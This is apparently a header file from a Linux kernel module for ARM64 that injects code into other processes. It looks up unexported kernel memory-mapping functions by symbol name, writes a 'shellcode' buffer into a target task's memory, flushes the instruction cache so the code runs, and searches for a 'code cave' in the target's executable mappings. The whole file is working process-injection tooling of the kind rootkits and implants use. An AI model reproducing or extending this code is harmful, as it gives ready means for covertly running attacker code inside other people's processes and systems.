/* SPDX-License-Identifier: GPL-2.0 */
#ifndef NVK_INJECT_H
#define NVK_INJECT_H

#include <linux/types.h>
#include <linux/compiler.h>
#include <linux/kallsyms.h>
#include <nvk_mem.h>
#include <nvk_process.h>
#include <nvk_vma.h>
#include <nvk_addr.h>

typedef void *(*nvk_do_mmap_fn)(void *file, unsigned long addr,
				unsigned long len, unsigned long prot,
				unsigned long flags, unsigned long pgoff,
				unsigned long *populate, void *uf);
typedef int   (*nvk_vm_mmap_fn)(void *file, unsigned long addr,
				unsigned long len, unsigned long prot,
				unsigned long flags, unsigned long pgoff);
typedef int   (*nvk_do_munmap_fn)(void *mm, unsigned long start,
				  size_t len, void *uf);

static nvk_do_mmap_fn   _nvk_do_mmap;
static nvk_vm_mmap_fn   _nvk_vm_mmap;
static nvk_do_munmap_fn _nvk_do_munmap;
static int              _nvk_inject_inited;

#define NVK_INJECT_PROT_READ  0x1
#define NVK_INJECT_PROT_WRITE 0x2
#define NVK_INJECT_PROT_EXEC  0x4
#define NVK_INJECT_MAP_ANON   0x20
#define NVK_INJECT_MAP_PRIVATE 0x02

static int nvk_inject_init(void)
{
	if (_nvk_inject_inited) return 0;

	_nvk_do_mmap = (nvk_do_mmap_fn)NVK_LOOKUP("do_mmap");
	_nvk_vm_mmap = (nvk_vm_mmap_fn)NVK_LOOKUP("vm_mmap");
	_nvk_do_munmap = (nvk_do_munmap_fn)NVK_LOOKUP("do_munmap");
	if (!_nvk_do_munmap)
		_nvk_do_munmap = (nvk_do_munmap_fn)NVK_LOOKUP("__do_munmap");

	_nvk_inject_inited = 1;
	return (_nvk_do_mmap || _nvk_vm_mmap) ? 0 : -1;
}

static long nvk_inject_write(struct task_struct *task,
			     unsigned long addr,
			     const void *data, size_t len)
{
	return nvk_vma_write_remote(task, addr, data, len);
}

static long nvk_inject_read(struct task_struct *task,
			    unsigned long addr,
			    void *buf, size_t len)
{
	return nvk_vma_read_remote(task, addr, buf, len);
}

struct nvk_shellcode {
	const u32   *code;
	int          insn_count;
	unsigned long entry_offset;
};

static int nvk_inject_shellcode(struct task_struct *task,
				const struct nvk_shellcode *sc,
				unsigned long target_addr)
{
	if (!task || !sc || !sc->code) return -1;
	if (sc->insn_count <= 0 || sc->insn_count > 1024)
		return -2;

	size_t code_sz = (size_t)sc->insn_count * 4;
	long ret = nvk_inject_write(task, target_addr,
				     sc->code, code_sz);
	if (ret) return (int)ret;

	unsigned long line;
	for (line = target_addr & ~63UL; line < target_addr + code_sz;
	     line += 64)
		__asm__ __volatile__("dc cvau, %0" :: "r"(line) : "memory");
	__asm__ __volatile__("dsb ish" ::: "memory");
	for (line = target_addr & ~63UL; line < target_addr + code_sz;
	     line += 64)
		__asm__ __volatile__("ic ivau, %0" :: "r"(line) : "memory");
	__asm__ __volatile__("dsb ish" ::: "memory");
	__asm__ __volatile__("isb" ::: "memory");
	return 0;
}

static unsigned long nvk_inject_find_cave(struct task_struct *task,
					  unsigned long min_size)
{
	struct nvk_vma_info info;
	int ret = nvk_vma_find_exec(task, min_size + 0x1000, &info);
	if (ret) return 0;
	return info.end - min_size - 64;
}

#endif /* NVK_INJECT_H */
